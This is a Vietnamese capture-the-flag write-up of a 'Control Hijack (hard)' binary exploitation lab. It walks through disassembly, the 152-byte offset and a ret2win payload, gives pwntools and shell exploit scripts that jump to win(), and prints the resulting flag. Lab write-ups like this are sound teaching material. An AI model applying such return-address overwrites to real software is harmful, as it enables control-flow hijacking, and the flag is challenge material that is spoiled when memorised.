## 📌 [Viettel Training Program] - Control Hijack (hard)

- **Category:** Binary Exploitation (Pwn)
- **Difficulty:** Hard
- **Points:** —
- **Description:** Cùng ý tưởng với bản easy — ghi đè return address để redirect vào `win()` — nhưng **không in offset, dump stack, hay source**. Buffer layout và địa chỉ `win()` có thể khác. Binary: `binary-exploitation-control-hijack`.

## 1. Khảo sát Ban đầu (Mitigation Check)

> Bước này giúp xác định các "lớp giáp" của file binary để biết phương pháp tấn công nào khả thi.

```bash
$ checksec ./binary-exploitation-control-hijack
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
```

**Nhận xét nhanh:**

- **Không Stack Canary** → Có thể ghi đè return address (giống bản easy).
- **NX enabled** → Không cần shellcode.
- **PIE disabled** → Địa chỉ `win()` cố định.
- **Không có output debug** (khác easy) → Offset và địa chỉ win phải tự tìm bằng disassembly.

**So với bản easy:**

| | Easy (`-w`) | Hard |
|---|-------------|------|
| Binary | `binary-exploitation-control-hijack-w` | `binary-exploitation-control-hijack` |
| Source | Có source | **Chỉ binary** |
| In offset / dump stack | Có | **Không** |
| Stack canary | Disabled (có thông báo) | **Disabled** |
| Offset → return address | 56 | **152** |
| Địa chỉ `win()` | `0x4014c8` | **`0x4013b4`** |
| Payload tối thiểu | 64 byte | **160 byte** |

## 2. Phân tích Tĩnh & Động (Reversing & Analysis)

### Phân tích tĩnh (objdump / Ghidra)

Disassembly hàm `challenge()` (địa chỉ `0x4014bb`):

```asm
; Khung stack: sub $0xb0, %rsp → 176 byte
sub    $0xb0, %rsp

; Khởi tạo vùng nhớ (15 QWORD + 1 DWORD + 1 WORD + 1 BYTE)
movq   $0x0, -0x90(%rbp)       ; input[0..7]
movq   $0x0, -0x88(%rbp)       ; input[8..15]
...
movq   $0x0, -0x20(%rbp)       ; input[?]
movl   $0x0, -0x18(%rbp)       ; 4 bytes
movw   $0x0, -0x14(%rbp)       ; 2 bytes
movb   $0x0, -0x12(%rbp)       ; 1 byte
movq   $0x1000, -0x8(%rbp)     ; size = 4096

; read(0, rbp-0x90, 4096)
lea    -0x90(%rbp), %rax        ; input buffer
mov    $0x1000, %edx
call   read@plt

; Không có win_variable, không có lose_variable
; Chỉ in "Goodbye!" rồi return
puts("Goodbye!");
leave
ret                            ; ← mục tiêu: hijack return address
```

Hàm `win()` tại `0x4013b4` (giống các bài trước — mở `/flag`, in nội dung).

### Tính offset

- Buffer bắt đầu tại `rbp-0x90`
- Return address (saved RIP) tại `rbp+8`
- Offset: `0x90 + 8 = 0x98 = 152` bytes

| Thành phần | Vị trí stack | Offset từ `input` |
|------------|--------------|-------------------|
| `input[...]` | `rbp-0x90` … | 0 – ? |
| ... | ... | ... |
| `size` | `rbp-0x8` | 136 – 143 |
| Saved RBP | `rbp+0` | 144 – 151 |
| **Saved return address** | **`rbp+8`** | **152 – 159** |

### Phân tích động (GDB / pwndbg)

```text
$ gdb ./binary-exploitation-control-hijack
pwndbg> break *challenge+0x139    # tại lệnh ret (0x4015f4)
pwndbg> run
Send your payload (up to 4096 bytes)!
pwndbg> cyclic 180
pwndbg> continue

Program received signal SIGSEGV
pwndbg> cyclic -l $rsp
[*] Found offset of 152
```

Hoặc chạy một lần với payload đúng:

```bash
python3 -c '
import sys
WIN_ADDR = 0x4013b4
payload = b"A" * 152 + WIN_ADDR.to_bytes(8, "little")
sys.stdout.buffer.write(payload)
' | ./binary-exploitation-control-hijack
```

Output:
```
Send your payload (up to 4096 bytes)!
Goodbye!
You win! Here is your flag:
```

=> **Offset tới return address = 152 bytes.**

## 3. Ý tưởng Tấn công (Exploit Strategy)

Giống bản easy — **ret2win** nhưng với offset khác:

1. Gửi **152 byte** padding (lấp buffer + các biến cục bộ + saved RBP).
2. Ghi **8 byte** địa chỉ của `win()` (`0x4013b4`) dạng little-endian.
3. Khi `challenge()` thực hiện `ret`, nó pop địa chỉ `win()` vào `RIP` → nhảy vào `win()`.

> **Không copy offset 56 từ bản easy** — hard có buffer layout khác, offset lên tới 152.

> Vẫn là ret2win cơ bản, không cần ROP chain — chỉ cần ghi đè một địa chỉ.

## 4. Mã Khai thác (Exploit Script)

```python
#!/usr/bin/env python3
from pwn import *

context.arch = "amd64"
context.log_level = "info"

# exe = ELF("./binary-exploitation-control-hijack")
# r = process("./binary-exploitation-control-hijack")
r = remote("HOST", PORT)  # thay HOST/PORT khi deploy remote

OFFSET_RIP = 152    # offset từ input tới return address (hard)
WIN_ADDR = 0x4013b4  # địa chỉ hàm win() (hard, khác easy: 0x4014c8)

payload = flat({
    OFFSET_RIP: p64(WIN_ADDR),
})

r.sendafter(b"Send your payload", payload)

r.interactive()
```

Payload tối thiểu (local):

```python
from pwn import *
r = process("./binary-exploitation-control-hijack")
r.sendafter(b"Send your payload", b"A" * 152 + p64(0x4013b4))
r.interactive()
```

Hoặc không dùng pwntools (local):

```bash
python3 -c '
import sys
WIN_ADDR = 0x4013b4
payload = b"A" * 152 + WIN_ADDR.to_bytes(8, "little")
sys.stdout.buffer.write(payload)
' | ./binary-exploitation-control-hijack
```

## 5. Kết quả & Flag

Chạy exploit trên môi trường challenge (có `/flag`, binary SUID nếu yêu cầu):

```text
Send your payload (up to 4096 bytes)!
Goodbye!
You win! Here is your flag:
pwn.college{48HJrKPd3cporSyl0GDjC3CkM1j.dRTOywSMzgjNwEzW}
```

*(Local không có `/flag` sẽ thấy lỗi mở file — vẫn chứng minh `win()` đã được gọi.)*

**Lessons Learned (Bài học rút ra):**

- Bản **hard** thay đổi **cả offset lẫn địa chỉ win**: offset 152 (≠ 56), win `0x4013b4` (≠ `0x4014c8`).
- Phải dùng **disassembly** để tìm offset: `rbp-0x90` → `rbp+8` = 152 byte.
- Dùng **GDB + cyclic** để xác nhận offset nhanh chóng.
- Dù không có source, ret2win vẫn hoạt động — miễn là không có canary và biết địa chỉ win.
- Luôn kiểm tra lại thông số từ bản easy — không copy mù quáng.
